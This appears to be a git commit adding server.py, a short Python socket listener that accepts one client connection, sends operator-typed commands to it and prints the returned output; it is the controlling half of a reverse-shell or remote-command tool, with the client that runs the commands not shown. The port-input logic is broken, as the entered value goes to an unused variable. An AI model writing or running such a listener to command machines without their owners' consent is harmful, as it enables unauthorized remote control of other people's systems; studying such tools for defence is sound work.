863d012b863cddbcff8474963893d920d2036142
Guava <103689068+kusakabeka@users.noreply.github.com>
2023-03-12 11:18:15 +0300

    Update server.py

---
+++ server.py
@@ -0,0 +1,26 @@
+import socket
+
+HOST = '127.0.0.1' # '192.168.43.82'
+PORT = 8081 # 2222
+
+new_port = input('Input Host Port (Blank if default).')
+if (new_port != "\n"):
+    REMOTE_PORT = new_port
+
+server = socket.socket()
+server.bind((HOST, PORT))
+
+print('[+] Server Started')
+print('[+] Listening For Client Connection ...')
+server.listen(1)
+client, client_addr = server.accept()
+print(f'[+] {client_addr} Client connected to the server')
+
+while True:
+    command = input('Enter Command : ')
+    command = command.encode()
+    client.send(command)
+    print('[+] Command sent')
+    output = client.recv(1024)
+    output = output.decode()
+    print(f"Output: {output}")
